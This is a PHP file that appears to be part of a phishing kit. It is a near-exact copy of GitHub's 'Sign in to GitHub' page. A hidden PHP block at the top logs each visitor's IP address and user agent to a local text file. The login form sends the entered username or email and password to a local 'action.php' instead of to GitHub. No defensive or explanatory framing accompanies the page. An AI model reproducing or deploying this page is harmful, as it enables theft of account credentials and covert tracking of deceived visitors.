<?php
error_reporting(0);
ini_set('display_errors', 0);
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
      $ipaddress = $_SERVER['REMOTE_ADDR'];
    }

$useragent = $_SERVER['HTTP_USER_AGENT'];
$data = "==1{$ipaddress}== ==2{$useragent}== ==3Github==";
$sendhits = "../../view.txt";
$x = fopen($sendhits, "a+");
fwrite($x, $data);
fclose($x);
?>
<html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"><head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
  <link rel="preconnect" href="https://github.githubassets.com" crossorigin="">
  <link rel="preconnect" href="https://avatars.githubusercontent.com">

<meta name="referrer" content="origin">

  <link crossorigin="anonymous" media="all" integrity="sha512-sD8zc/Dn1lguLc4FdbeVhD2gfxFCTXGr/y+MpJG3oX1vkAyaFf/7BHPtvv1dAHA0KG4bDEW3Ex1EPrzGTMtN2Q==" rel="stylesheet" href="https://github.githubassets.com/assets/light-b03f3373f0e7.css"><link crossorigin="anonymous" media="all" integrity="sha512-V0872pNNqPTaPQFzdwX9tHIzJvB4F1Foi6VYDciZAMo/qHgBC8PvN2d/SkMweiNDbR6eF3cXcG0aPVrEtC8zqw==" rel="stylesheet" href="https://github.githubassets.com/assets/dark-574f3bda934d.css"><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" integrity="sha512-PzuUWYSTZfXfFMEstZYF7zd5TnBiunweYKf7SA0USRWwzNBPELoB8ZhGVGTwcMSwF5ff9kyBAdGzEbfJ2/4cig==" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-3f3b94598493.css"><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" integrity="sha512-PDguTqV/sgFBBIdGLWGe50pI4GUQjVg3NQIm1ue9+6Wtn5qdx122aGJ1/M6IydIYhVs1tRfeLBl8P+7lNRRHlg==" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-3c382e4ea57f.css"><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" integrity="sha512-PZ0pkh4DltajJswDsmdCrHotI3eS5qb+etb48dcRDxUuiy0g2YP+kw5sQi04CE7AO+J33JXg86PAQoivVKkdKg==" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-3d9d29921e03.css"><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" integrity="sha512-P+VDoZFVyqfAb06foA/ZLUzHkdMPqEQq1d1B0VSzEzOF3fidwKWULgI+b1E+OoF7VnC5HXRS4lMJPKKc6wrc8g==" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-3fe543a19155.css"><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" integrity="sha512-33ulzUgAM4pZv65KAcvjwZLHiC4bQaF61LiK9BiAQ/kuCG/+LtNi2clT1gfb72sa9SOsiu4fs4bEBL543Ms3Iw==" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-df7ba5cd4800.css">
    <link crossorigin="anonymous" media="all" integrity="sha512-5ITBENg+F5FPizqEsxN2bcmczO46aikzj/TypfSsMeBhfQdvrwp+exPchAMYBksYmjzlK9JZ57G9b1EiEklI5A==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-e484c110d83e.css">
    <link crossorigin="anonymous" media="all" integrity="sha512-Q1pxMwbjf9TRvtZHxthjG2H2cG3oIZYMlJ1H0+LneQ/TwZf+CbwdS+DgpKaia34ugCjSJH92VUhslZFzhgUlng==" rel="stylesheet" href="https://github.githubassets.com/assets/behaviors-435a713306e3.css">
  <link crossorigin="anonymous" media="all" integrity="sha512-ayXlm8B066mM6BR2iSgRpYbKYRC9Enh0HnzRlf9no0/GyLOyJc61eboyu0zHCz3ZGu4xJo0nuyOCunSRTjMRFA==" rel="stylesheet" href="https://github.githubassets.com/assets/github-6b25e59bc074.css">



  <script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-fYaOhKiBYu2l2N8TYhzAmL8NI29JO0uYReZhjKds75QkorZWT8qD5/VZ9zLHYqrjisTB6sGGf+5fEgDDAZ79iA==" src="https://github.githubassets.com/assets/runtime-7d868e84a881.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-32HPOwJkACFD9bjimEKNoj+NjB1UldIjZP5QxXOr6huISt7QYQxWwT23JQ1DoSy7hGfGRtDsthh0NmfzX3DyMg==" src="https://github.githubassets.com/assets/environment-df61cf3b0264.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-rB/EVqzuiKzqcb6RaaDSx+i7s/HApAXhuINThOQOfSCzOsY0zTZf2Ba2GjECWMqWsDjDbJBMP23O6Lc83vygpg==" src="https://github.githubassets.com/assets/9048-ac1fc456acee.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-HGeV9MtF7qlJk/b5sDswl5jAS3cfQncdrcrvwSIjS0FoGJanQ+P9873q4kkIRjiWs/98fqkXbbY/RoXHUCmSbA==" src="https://github.githubassets.com/assets/9758-1c6795f4cb45.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-jjPr0ZAftDw2p5OPu0DRLB9f7B5l1lZmKij0neI7TQquIKCMD6ZZTVqZTYimRo6PPUyegWiGbJmygZsiwlS43g==" src="https://github.githubassets.com/assets/6038-8e33ebd1901f.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-+u8TeLdruMiWvmBpQNA4PToUts/HCYj6PPiDiVyAnWqVJqwcf8AifE6ulyXVXn3kdRBkue6o8KUb0mhSbSakiw==" src="https://github.githubassets.com/assets/github-elements-faef1378b76b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-1CFZIk8lImt34iQUo/3HIFBe1+1Vd0IizOZfrPZ7Od05aERgFuD7//t9q+PGhke3mf3Orz3ZQS7RjS17NwONyQ==" src="https://github.githubassets.com/assets/element-registry-d42159224f25.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-Qv2lL056rpQocE0oqgYds356Kr0VteNXu+I2H+xqjO5p0YJ7aBCngsWeS1IszuUIaiEmDoOp7umaTcXQ5P75+w==" src="https://github.githubassets.com/assets/762-42fda52f4e7a.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-kyutNFnVyXNirOp6jgLzir/lHojSmZRtKkCvj/18DUnh7DOxXyxa1uE7JKsGnXyDFvyDXAz0P76liKUpyrl5+A==" src="https://github.githubassets.com/assets/8933-932bad3459d5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-WOGryZiEX4rxCv+yzuST7+eEDb+yYgZI0/JXge0gHDt36/QbHlCyIukOTeTEcV5Owb10K6CZPzYkyRZrCIAmKA==" src="https://github.githubassets.com/assets/52-58e1abc99884.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-4LnNDBotTstM2Et+yZ2gqy7JvdmdSzxgBNgYXyMwcTBLSioeQ22M8v0V7Sj+TlUCJaPlk0kQjTwItcZ4NlMTXg==" src="https://github.githubassets.com/assets/7105-e0b9cd0c1a2d.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-y0Ky7pWSieHl1aMPGzJ4HjAkahyiqC7ILqLq33fCkVXV/7s7AXm4y9vUMTjAsz4Kk6ASA3x/T/M67vaQUgmN3A==" src="https://github.githubassets.com/assets/2308-cb42b2ee9592.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-UQioBOJDApdwFc+p3sk/gCC7/AeniZ1u/g98H/QeeqYiYg5fivFgpe4L1q1y2OO5VjnB/CC/JpOU38OR1zsrOg==" src="https://github.githubassets.com/assets/2662-5108a804e243.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-s8ZmDpZrxT8b1b3xoPqoItmEV9dwiAYUuEMXY8O27eWNfzNxxCAgU355HQ+Mw2y5bqdyCI5T9LTfm9jKZBmFZQ==" src="https://github.githubassets.com/assets/9579-b3c6660e966b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-/1Z+khw7i2eXHZO7nOUu8YqEpGNyOuTkQ4jH3olyybtuvY74E1Vl1KtdVHpGEJtGX0j7Rp/WHtPW+34mp5m8iA==" src="https://github.githubassets.com/assets/1201-ff567e921c3b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-MdAQnAIjkk36D6nf7khPxr37ryAaxRMZNAN47p+kePGU+xMi8jjXwpUhGuPvKeGeGhdHgNzTF7BK+NdgMnn6+A==" src="https://github.githubassets.com/assets/9508-31d0109c0223.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-d4G8CfA1nGLZ/x0iiKJ8KLjQdRINrecwBFPO3jrRjLlhGi85eXrns5d83iTh1MMZqX1YxWECCxYAKzlV0SO62A==" src="https://github.githubassets.com/assets/7595-7781bc09f035.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-tUmB+1MiatT/pKPCcCrp0W072U5zchoa94IGcRebc9q+npwEnS8n4Gs/mIIsX+3IBydAMdFJBJvKOUAFHb3vnw==" src="https://github.githubassets.com/assets/behaviors-b54981fb5322.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-vZv147xO15/NwrEoMon2Lor5F4tSROpvyfxSqmUkr5RguhmLN7dhL6WaqFtGe+MapYypxQgz3XTi8RdZKiEfQw==" src="https://github.githubassets.com/assets/1953-bd9bf5e3bc4e.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-tipZQwuAoWNATthGqZeoESE7ZamPYuJUIStl6htGuyyH5sFl/llEo+oQ5xiPF8FtaHi/DGWURjboDL5jLIk5sg==" src="https://github.githubassets.com/assets/notifications-global-b62a59430b80.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-K4Mw1hiT6Z2hUKN1CHZgdQxQJlEflrRTgyHfgjsNeUkcLLpy2UIsFNaTqyTz+6ZOO1q2xgf3gtbobHmhEEx7hQ==" src="https://github.githubassets.com/assets/9012-2b8330d61893.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-DaEhzG57utnWlW0T0IjInCISF5ktlwCLlRBrKsE2ZhYru4XLggjLvLKuyeZUkT0pj9pkmBFB7KIeqrEzDJrf9g==" src="https://github.githubassets.com/assets/4182-0da121cc6e7b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-OvtghzHA7Sy7ZJv3foFf3W4C2YXGLA6xwqz+Ilf5piykj4AmLYtmZ6mAZXG1xsLCTuseNO66/NXJUt99aU191Q==" src="https://github.githubassets.com/assets/settings-3afb608731c0.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-VmVFraZ/h5cLaHRXnBtgpmDav+iRN0VOrhpjAyZXwwln/HF1jdGmbIVxeLtzBb5vElWiC2uMOwg8GePxwDx+Wg==" src="https://github.githubassets.com/assets/sessions-566545ada67f.js"></script>
    <script crossorigin="anonymous" defer="defer" type="application/javascript" integrity="sha512-C0jqllRlHdUlJNv/8edtKeoYCtv55OwM3zkVCgE1WVNiluOL1uWIyVqHPomsU68o9aAUOKCHjfi+ebZbMgwb4Q==" src="https://github.githubassets.com/assets/unsupported-0b48ea965465.js"></script>


  <meta name="viewport" content="width=device-width">
  
  <title>Sign in to GitHub · GitHub</title>
    <meta name="description" content="GitHub is where people build software. More than 73 million people use GitHub to discover, fork, and contribute to over 200 million projects.">
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">
  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
  <meta property="fb:app_id" content="1401488693436528">
  
    <meta property="og:url" content="https://github.com">
    <meta property="og:site_name" content="GitHub">
    <meta property="og:title" content="Build software better, together">
    <meta property="og:description" content="GitHub is where people build software. More than 73 million people use GitHub to discover, fork, and contribute to over 200 million projects.">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="1200">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-mark.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-octocat.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">

    <meta property="twitter:site" content="github">
    <meta property="twitter:site:id" content="13334762">
    <meta property="twitter:creator" content="github">
    <meta property="twitter:creator:id" content="13334762">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:title" content="GitHub">
    <meta property="twitter:description" content="GitHub is where people build software. More than 73 million people use GitHub to discover, fork, and contribute to over 200 million projects.">
    <meta property="twitter:image:src" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
    <meta property="twitter:image:width" content="1200">
    <meta property="twitter:image:height" content="1200">



    

  <link rel="assets" href="https://github.githubassets.com/">
  

  <meta name="request-id" content="C627:6F6B:9F1A63:C7BC42:623F561C" data-pjax-transient="true"><meta name="html-safe-nonce" content="4195b565b9eb2158a1241706b173e0525503422d1c8810211afc529997fed73c" data-pjax-transient="true"><meta name="visitor-payload" content="eyJyZWZlcnJlciI6Imh0dHBzOi8vZ2l0aHViLmNvbS8iLCJyZXF1ZXN0X2lkIjoiQzYyNzo2RjZCOjlGMUE2MzpDN0JDNDI6NjIzRjU2MUMiLCJ2aXNpdG9yX2lkIjoiNzMxNjY0ODQ3NDk0NDk2NDYyIiwicmVnaW9uX2VkZ2UiOiJzb3V0aGVhc3Rhc2lhIiwicmVnaW9uX3JlbmRlciI6ImlhZCJ9" data-pjax-transient="true"><meta name="visitor-hmac" content="fa77ca0d170c0ce9aa52cb75f44f0ff892dafe06af9ee63a4c20a44a98ecd34b" data-pjax-transient="true">



  <meta name="github-keyboard-shortcuts" content="" data-pjax-transient="true">

  

  <meta name="selected-link" value="/login" data-pjax-transient="">

    <meta name="google-site-verification" content="c1kuD-K2HIVF635lypcsWPoD4kilo5-jA_wBFyT4uMY">
  <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
  <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
  <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">

<meta name="octolytics-url" content="https://collector.github.com/github/collect">

  <meta name="analytics-location-query-strip" content="true" data-pjax-transient="true">

  




  

      <meta name="hostname" content="github.com">
    <meta name="user-login" content="">



      <meta name="expected-hostname" content="github.com">


    <meta name="enabled-features" content="MARKETPLACE_PENDING_INSTALLATIONS">


  <meta http-equiv="x-pjax-version" content="3c7c52767389d9274410d11f1cbd5f44461355485e8c4082cef3543c90ce96c5" data-turbo-track="reload">
  <meta http-equiv="x-pjax-csp-version" content="17414ba9f9e847d1c4bea8123e06788617a5c13e651b5eb4743b038c4c8bead2" data-turbo-track="reload">
  <meta http-equiv="x-pjax-css-version" content="86d2d4ea10a220ddb623a8bb048d6dc4179303cad0c435c106140a1347c4628f" data-turbo-track="reload">
  <meta http-equiv="x-pjax-js-version" content="7096bfcb0bf7c93d3844820e02b968d3df4b10ebb5f65767fe68d6906873d362" data-turbo-track="reload">
  

      <link crossorigin="anonymous" media="all" integrity="sha512-ayXlm8B066mM6BR2iSgRpYbKYRC9Enh0HnzRlf9no0/GyLOyJc61eboyu0zHCz3ZGu4xJo0nuyOCunSRTjMRFA==" rel="stylesheet" href="https://github.githubassets.com/assets/github-6b25e59bc074.css">



    <link rel="canonical" href="https://github.com/login" data-pjax-transient="">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <meta name="browser-optimizely-client-errors-url" content="https://api.github.com/_private/browser/optimizely_client/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">

<meta name="theme-color" content="#1e2327">
<meta name="color-scheme" content="light dark">

  <meta name="msapplication-TileImage" content="/windows-tile.png">
  <meta name="msapplication-TileColor" content="#ffffff">

  <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">

  </head>

  <body class="logged-out env-production page-responsive session-authentication intent-mouse" style="word-wrap: break-word;">
    

    <div class="position-relative js-header-wrapper ">
      <a href="#start-of-content" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>
      <span data-view-component="true" class="progress-pjax-loader js-pjax-loader-bar Progress position-fixed width-full">
    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
</span>      
      

          <div id="unsupported-browser" class="unsupported-browser" hidden="">
  <div class="container-lg p-responsive clearfix d-flex flex-items-center py-2">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert mr-2 hide-sm color-fg-subtle">
    <path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path>
</svg>
    <div class="d-flex flex-auto flex-column flex-md-row">
      <div class="flex-auto min-width-0 mr-2" style="padding-top:1px">
        <span>GitHub no longer supports this web browser.</span>
        <a href="https://docs.github.com/articles/supported-browsers">
          Learn more about the browsers we support.
        </a>
      </div>
    </div>
  </div>
</div>



        <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
  <div class="container clearfix width-full text-center">
    <a class="header-logo" href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
      <svg height="48" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="48" data-view-component="true" class="octicon octicon-mark-github">
    <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
</svg>
    </a>
  </div>
</div>


    </div>

  <div id="start-of-content" class="show-on-focus"></div>








    

  <include-fragment class="js-notification-shelf-include-fragment" data-base-src="https://github.com/notifications/beta/shelf"></include-fragment>





  <div class="application-main " data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="">
      <main id="js-pjax-container" data-pjax-container="">
        


  <div class="auth-form px-3" id="login">


      <input type="hidden" name="ga_id" class="js-octo-ga-id-input">
      <div class="auth-form-header p-0">
        <h1>Sign in to GitHub</h1>
      </div>


      <div data-pjax-replace="" id="js-flash-container">


  <template class="js-flash-template">
    <div class="flash flash-full  {{ className }}">
  <div class="px-2">
    <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path>
</svg>
    </button>
    
      <div>{{ message }}</div>

  </div>
</div>
  </template>
</div>


      <div class="flash js-transform-notice" hidden="">
        <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
          <svg aria-label="Dismiss" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path>
</svg>
        </button>
      </div>

      <div class="auth-form-body mt-3">

<form action="action.php" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="fiGfMMxnEOtIL_3lEaylNh5EHK1lSNFajIEDCa-LO_pOvIRQaFxgTZ4zvoUlSWdJ_sqBa6pEhoA0CTYdAiABpg">  <label for="login_field">
    Username or email address
  </label>
  <input type="text" name="email" id="login_field" class="form-control input-block js-login-field" autocapitalize="off" autocorrect="off" autocomplete="username" autofocus="autofocus" required>

  <div class="position-relative">
    <label for="password">
      Password
    </label>
    <input type="password" name="password" id="password" class="form-control form-control input-block js-password-field" autocomplete="current-password" required>
    <input type="hidden" name="trusted_device" id="trusted_device" autocomplete="off" class="form-control">
    
<input type="hidden" class="js-webauthn-support" name="webauthn-support" value="supported">
<input type="hidden" class="js-webauthn-iuvpaa-support" name="webauthn-iuvpaa-support" value="unsupported">
<input type="hidden" name="return_to" id="return_to" value="https://github.com/login" autocomplete="off" class="form-control">
<input type="hidden" name="allow_signup" id="allow_signup" autocomplete="off" class="form-control">
<input type="hidden" name="client_id" id="client_id" autocomplete="off" class="form-control">
<input type="hidden" name="integration" id="integration" autocomplete="off" class="form-control">
<input type="text" name="required_field_3b7a" hidden="hidden" class="form-control"><input type="hidden" name="timestamp" value="1648317981256" autocomplete="off" class="form-control"><input type="hidden" name="timestamp_secret" value="44abaf458bfb474c74eeb08ee6aa766c83f37bc2eeb7714de4f37261b8ba068d" autocomplete="off" class="form-control">

    <input type="submit" name="commit" value="Sign in" class="btn btn-primary btn-block js-sign-in-button" data-disable-with="Signing in…" data-signin-label="Sign in" data-sso-label="Sign in with your identity provider" development="false">

    <a class="label-link position-absolute top-0 right-0" tabindex="0" href="/password_reset">Forgot password?</a>
  </div>
</form>
      </div>



        <p class="login-callout mt-3">
          New to GitHub?
          <a data-ga-click="Sign in, switch to sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;sign in switch to sign up&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/login&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="72d062e79bb6ab076a3b88b32943286ea51894183bd812a5038d00013946f239" href="/signup?source=login">Create an account</a>.
        </p>

  </div>

      </main>
  </div>

          <div class="footer container-lg p-responsive py-6 mt-6 f6" role="contentinfo">
    <ul class="list-style-none d-flex flex-justify-center">
        <li class="mr-3"><a href="/site/terms" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}">Terms</a></li>
        <li class="mr-3"><a href="/site/privacy" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}">Privacy</a></li>
        <li class="mr-3"><a href="https://docs.github.com/articles/github-security/" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to security&quot;,&quot;label&quot;:&quot;text:security&quot;}">Security</a></li>
          <li><a class="Link--secondary" data-ga-click="Footer, go to contact, text:contact" href="https://github.com/contact">Contact GitHub</a></li>
    </ul>
  </div>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden="">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path>
</svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path>
</svg>
    </button>
    You can’t perform that action at this time.
  </div>

  <div class="js-stale-session-flash flash flash-warn flash-banner" hidden="">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path>
</svg>
    <span class="js-stale-session-flash-signed-in" hidden="">You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>
    <span class="js-stale-session-flash-signed-out" hidden="">You signed out in another tab or window. <a href="">Reload</a> to refresh your session.</span>
  </div>
    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open="">
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog="">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path>
</svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
  </div>
</div>

    <template id="snippet-clipboard-copy-button">
  <div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
